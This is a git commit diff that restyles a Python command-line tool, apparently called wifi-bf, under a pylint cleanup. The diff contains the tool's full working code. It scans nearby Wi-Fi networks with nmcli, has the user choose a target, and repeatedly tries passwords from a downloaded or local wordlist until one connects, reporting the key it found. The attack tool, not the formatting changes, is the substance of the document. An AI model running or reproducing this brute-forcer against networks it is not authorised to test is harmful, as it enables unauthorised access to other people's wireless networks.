a0fe79a0c6bc4a31504701cd81a28f63ab8e4d16
Pablo <pablolucas890@gmail.com>
2026-04-22 15:44:45 -0300

    cleanup: adding pylint config on project

--- src/__main__.py
+++ src/__main__.py
@@ -1,18 +1,25 @@
 import argparse
 import subprocess
 import os
-from ssid import start
 import urllib.request
 import sys
 import time
+from ssid import start
 
-# service NetworkManager restart
 
 def cls():
-    os.system('cls' if os.name == 'nt' else 'clear')
-    
+    """
+    This function clears the screen
+    """
+    os.system("cls" if os.name == "nt" else "clear")
+
+
 def header():
-    print('''
+    """
+    This function prints the header of the program
+    """
+    print(
+        """
 ==============================================================
 	██╗    ██╗██╗███████╗██╗      ██████╗ ███████╗
 	██║    ██║██║██╔════╝██║      ██╔══██╗██╔════╝
@@ -22,163 +29,162 @@ def header():
 	 ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝      ╚═════╝ ╚═╝     
                                      
                  https://github.com/flancast90
-                         By: BLUND3R                 
+                         By: BLUND3R
+                 https://github.com/pablolucas890
+                         By: P89L0
 ==============================================================
     
-    ''')
-
-class bcolors:
-    HEADER = '\033[95m'
-    OKBLUE = '\033[94m'
-    OKCYAN = '\033[96m'
-    OKGREEN = '\033[92m'
-    WARNING = '\033[93m'
-    FAIL = '\033[91m'
-    ENDC = '\033[0m'
-    BOLD = '\033[1m'
-    UNDERLINE = '\033[4m'
-    VERBOSEGRAY = '\033[170m'
+    """
+    )
 
 
-"""
-    This function cutlize the argparse which gives a description of the program and
-    the list of arguments supported
-"""
+class Bcolors:
+    """
+    This class contains the color codes for the program
+    """
+
+    HEADER = "\033[95m"
+    OKBLUE = "\033[94m"
+    OKCYAN = "\033[96m"
+    OKGREEN = "\033[92m"
+    WARNING = "\033[93m"
+    FAIL = "\033[91m"
+    ENDC = "\033[0m"
+    BOLD = "\033[1m"
+    UNDERLINE = "\033[4m"
+    VERBOSEGRAY = "\033[170m"
 
 
 def argument_parser():
+    """
+    This function cutlize the argparse which gives a description of the program and
+    the list of arguments supported
+    """
     parser = argparse.ArgumentParser(
-        prog="wifi-bf",
-        description="Brute force wifi password with python 3"
+        prog="wifi-bf", description="Brute force wifi password with python 3"
     )
 
     parser.add_argument(
-        '-u', '--url',
+        "-u",
+        "--url",
         type=str,
         default=None,
-        help='The url that contains the list of passwords'
+        help="The url that contains the list of passwords",
     )
     parser.add_argument(
-        '-f', '--file',
+        "-f",
+        "--file",
         type=str,
         default=None,
-        help='The file that contains the list of passwords'
+        help="The file that contains the list of passwords",
     )
-    
+
     parser.add_argument(
-    	'-v', '--verbose',
-    	action='store_true',
-    	help='Optional: Use to show all passwords attempted, rather than just the successful one.'
+        "-v",
+        "--verbose",
+        action="store_true",
+        help="Optional: Use to show all passwords attempted, rather than just the successful one.",
     )
 
     return parser.parse_args()
 
 
-"""
-	This functions returns a list of passwords from a url
-"""
-
-
 def fetch_password_from_url(url):
+    """
+    This function returns a list of passwords from a url
+    """
     try:
         return urllib.request.urlopen(url)
-    except:
+    except Exception as e:
+        print(f"Error fetching passwords from url: {e}")
         return None
 
 
-"""
-	This functions saves a list of passwords to a file
-"""
-
-
 def save_passwords_locally(passwords):
-    with open('passwords.txt', 'w') as file:
-            for password in passwords:
-                decoded_line = password.decode("utf-8")
-                file.write(decoded_line)
+    """
+    This function saves a list of passwords to a file
+    """
 
-
-"""
-	This functions checks if a local password file is found
-"""
+    with open("passwords.txt", "w", encoding="utf-8") as file:
+        for password in passwords:
+            decoded_line = password.decode("utf-8")
+            file.write(decoded_line)
 
 
 def local_passwords_file_exists():
-    return os.path.exists('passwords.txt')
+    """
+    This function checks if a local password file is found
+    """
 
-
-"""
-	This functions returns a local previously downloaded local passwords file
-"""
+    return os.path.exists("passwords.txt")
 
 
 def get_local_passwords():
-    with open('passwords.txt', 'r') as file:        
+    """
+    This function returns a local previously downloaded local passwords file
+    """
+
+    with open("passwords.txt", "r", encoding="utf-8") as file:
         return file.readlines()
 
 
-"""
-	This functions checks whether the user is running the program as root. If the user is not a root,
-	an error message is displayed and the program exit
-"""
-
-
 def require_root():
+    """
+    This function checks whether the user is running the program as root. If the user is not a root,
+    an error message is displayed and the program exit
+    """
+
     r = os.popen("whoami").read()
-    if (r.strip() != "root"):
+    if r.strip() != "root":
         print("Run it as root.")
         sys.exit(-1)
 
 
-"""
-	This functions shows the user the list of targets
-"""
-
-
 def display_targets(networks, security_type):
+    """
+    This function shows the user the list of targets
+    """
     print("Select a target: \n")
-    
-    rows, columns = os.popen('stty size', 'r').read().split()
-    for i in range(len(networks)):
-        width = len(str(str(i+1)+". "+networks[i]+security_type[i]))+2
+
+    _, columns = os.popen("stty size", "r").read().split()
+    for i in enumerate(networks):
+        width = len(str(str(i[0] + 1) + ". " + i[1] + security_type[i[0]])) + 2
         spacer = " "
 
-        if (int(columns) >= 100):
-            calc = int((int(columns)-int(width))*0.75)
+        if int(columns) >= 100:
+            calc = int((int(columns) - int(width)) * 0.75)
         else:
-            calc = int(columns)-int(width)
-            
+            calc = int(columns) - int(width)
+
         for index in range(calc):
             spacer += "."
-            if index == (calc-1):
+            if index == (calc - 1):
                 spacer += " "
-                
-        print(str(i+1)+". "+networks[i]+spacer+security_type[i])
-        
-"""
-	This functions prompt the user to enter the target choice and returns the choice.
-	The function runs in a loop until the user enter the correct target
-"""
+
+        print(str(i[0] + 1) + ". " + i[1] + spacer + security_type[i[0]])
 
 
-def prompt_for_target_choice(max):
+def prompt_for_target_choice(max_targets):
+    """
+    This function prompt the user to enter the target choice and returns the choice.
+    The function runs in a loop until the user enter the correct target
+    """
     while True:
         try:
             selected = int(input("\nEnter number of target: "))
-            if(selected >= 1 and selected <= max):
+            if selected >= 1 and selected <= max_targets:
                 return selected - 1
         except Exception as e:
-            ignore = e
+            print(f"Invalid choice: {e}")
 
-        print("Invalid choice: Please pick a number between 1 and " + str(max))
-
-
-"""
-	This function takes the targeted network and list of password and attempt to brute force it.
-"""
+        print("Invalid choice: Please pick a number between 1 and " + str(max_targets))
 
 
 def brute_force(selected_network, passwords, args):
+    """
+    This function takes the targeted network and list of password and attempt to brute force it.
+    """
+
     nmcli_command = f"nmcli connection delete '{selected_network}'"
 
     if args.verbose is False:
@@ -194,24 +200,29 @@ def brute_force(selected_network, passwords, args):
             decoded_line = password
         else:
             decoded_line = password.decode("utf-8")
-            
-        if args.verbose is True:
-            print(bcolors.HEADER+"** TESTING **: with password '" +
-                decoded_line+"'"+bcolors.ENDC)
 
-        if (len(decoded_line) >= 8):
+        if args.verbose is True:
+            print(
+                Bcolors.HEADER
+                + "** TESTING **: with password '"
+                + decoded_line
+                + "'"
+                + Bcolors.ENDC
+            )
+
+        if len(decoded_line) >= 8:
             contain = False
-            
-            while contain == False:
+
+            while contain is False:
                 available = os.popen("nmcli -f SSID dev wifi").read()
-                available = available.split('\n')
+                available = available.split("\n")
                 available = [item.strip() for item in available]
-            
+
                 if selected_network in available:
                     contain = True
                 else:
                     time.sleep(1)
-            
+
             commands = [
                 "sudo",
                 "nmcli",
@@ -222,39 +233,58 @@ def brute_force(selected_network, passwords, args):
                 "password",
                 decoded_line,
             ]
-            
+
             try:
-                output = subprocess.run(commands, capture_output=True, text=True, 
-                    check=True)
+                output = subprocess.run(
+                    commands, capture_output=True, text=True, check=True
+                )
                 if "error" in output.stdout.lower():
                     if args.verbose is True:
-                        print(bcolors.FAIL+"** TESTING **: password '" +
-                            decoded_line+"' failed."+bcolors.ENDC)
-                        print(f"{bcolors.VERBOSEGRAY}{output.stdout}{bcolors.ENDC}")
+                        print(
+                            Bcolors.FAIL
+                            + "** TESTING **: password '"
+                            + decoded_line
+                            + "' failed."
+                            + Bcolors.ENDC
+                        )
+                        print(f"{Bcolors.VERBOSEGRAY}{output.stdout}{Bcolors.ENDC}")
                 elif "successfull" in output.stdout.lower():
-                    sys.exit(bcolors.OKGREEN+"** KEY FOUND! **: password '" +
-                        decoded_line+"' succeeded."+bcolors.ENDC)
+                    sys.exit(
+                        Bcolors.OKGREEN
+                        + "** KEY FOUND! **: password '"
+                        + decoded_line
+                        + "' succeeded."
+                        + Bcolors.ENDC
+                    )
                 else:
                     print(f"Unknown output: {output.stdout}")
             except subprocess.CalledProcessError:
                 if args.verbose is True:
-                    print(bcolors.FAIL+"** TESTING **: password '" +
-                        decoded_line+"' failed."+bcolors.ENDC)
+                    print(
+                        Bcolors.FAIL
+                        + "** TESTING **: password '"
+                        + decoded_line
+                        + "' failed."
+                        + Bcolors.ENDC
+                    )
 
         else:
             if args.verbose is True:
-                print(bcolors.OKCYAN+"** TESTING **: password '" +
-                    decoded_line+"' too short, passing."+bcolors.ENDC)
+                print(
+                    Bcolors.OKCYAN
+                    + "** TESTING **: password '"
+                    + decoded_line
+                    + "' too short, passing."
+                    + Bcolors.ENDC
+                )
 
-    print(bcolors.FAIL+"** RESULTS **: All passwords failed :("+bcolors.ENDC)
-
-
-"""
-	The main function
-"""
+    print(Bcolors.FAIL + "** RESULTS **: All passwords failed :(" + Bcolors.ENDC)
 
 
 def main():
+    """
+    The main function
+    """
     cls()
     header()
     require_root()
@@ -265,11 +295,11 @@ def main():
         passwords = fetch_password_from_url(args.url)
     # user elect to read passwords form a file
     elif args.file is not None:
-        file = open(args.file, "r")
+        file = open(args.file, "r", encoding="utf-8")
         passwords = file.readlines()
         if not passwords:
             print("Password file cannot be empty!")
-            exit(0)
+            sys.exit(0)
         file.close()
     else:
         # fallback to the default list as the user didn't supply a password list
@@ -281,27 +311,30 @@ def main():
         elif local_passwords_file_exists():
             passwords = get_local_passwords()
         else:
-            sys.exit(bcolors.FAIL+"Fetch failed. Check internet status."+bcolors.ENDC)
-        
+            sys.exit(
+                Bcolors.FAIL + "Fetch failed. Check internet status." + Bcolors.ENDC
+            )
 
     # grabbing the list of the network ssids
     func_call = start(1)
     networks = func_call[0]
     security_type = func_call[1]
-    
+
     if not networks:
         print("No networks found!")
         sys.exit(-1)
 
     display_targets(networks, security_type)
-    max = len(networks)
-    pick = prompt_for_target_choice(max)
+    max_targets = len(networks)
+    pick = prompt_for_target_choice(max_targets)
     target = networks[pick]
-    
+
     cls()
     header()
-    
-    print("\nWifi-bf is running. If you would like to see passwords being tested in realtime, enable the [--verbose] flag at start.")
+
+    print(
+        "\nWifi-bf is running. If you would like to see the tests in realtime, enable the [-v] flag at start."
+    )
 
     brute_force(target, passwords, args)
 
--- src/ssid.py
+++ src/ssid.py
@@ -1,29 +1,49 @@
 import subprocess
 
+
 def start(code):
-	r = subprocess.run(["nmcli", "-f", "SSID", "dev", "wifi"], capture_output=True, text=True).stdout
-	grep = r.split("\n")
-	
-	s = subprocess.run(["nmcli", "-f", "SECURITY", "dev", "wifi"], capture_output=True, text=True).stdout
-	grep_s = s.split("\n")
+    """
+    This function starts the program
+    """
+    r = subprocess.run(
+        ["nmcli", "-f", "SSID", "dev", "wifi"],
+        capture_output=True,
+        text=True,
+        check=True,
+    ).stdout
+    grep = r.split("\n")
 
-	networks = [k.strip() for k in grep if (k.strip() != "SSID") and (k.strip() != "--") and (k.strip() != "")]
-	net_type = [k.strip() for k in grep_s if (k.strip() != "SECURITY") and (k.strip() != "")]
-	
+    s = subprocess.run(
+        ["nmcli", "-f", "SECURITY", "dev", "wifi"],
+        capture_output=True,
+        text=True,
+        check=True,
+    ).stdout
+    grep_s = s.split("\n")
 
-	ssid = []
-	security = []
+    networks = [
+        k.strip()
+        for k in grep
+        if (k.strip() != "SSID") and (k.strip() != "--") and (k.strip() != "")
+    ]
+    net_type = [
+        k.strip() for k in grep_s if (k.strip() != "SECURITY") and (k.strip() != "")
+    ]
 
-	for i in range(len(networks)):
-		if networks[i] not in ssid:
-			ssid.append(networks[i])
-			security.append(net_type[i])
-	
-	if (code == 0):
-		print(ssid)
-		print(security)
-	else:
-		return [ssid, security]
-		
+    ssid = []
+    security = []
+
+    for i in enumerate(networks):
+        if i[1] not in ssid:
+            ssid.append(i[1])
+            security.append(net_type[i[0]])
+
+    if code == 0:
+        print(ssid)
+        print(security)
+    else:
+        return [ssid, security]
+
+
 if __name__ == "__main__":
-	start(0)
+    start(0)
